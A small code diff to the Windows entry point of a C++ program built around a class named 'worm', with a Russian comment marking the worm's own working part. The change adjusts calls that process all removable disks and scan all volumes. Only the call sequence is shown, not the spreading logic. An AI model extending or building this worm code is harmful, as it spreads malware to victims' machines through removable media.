@@ -27,12 +27,9 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 	worm::instance = &worm1;
 
 
-	//worm1.worm_was_started();
 	// часть с работой самого червя
 	
-	worm worm1;
-	worm::instance =&worm1;
-	worm1.worm_was_started();
+	//worm1.worm_was_started();
 	worm1.process_all_removable_disks();
 	worm1.scan_all_volumes();
 	//worm1.print_list_dir();
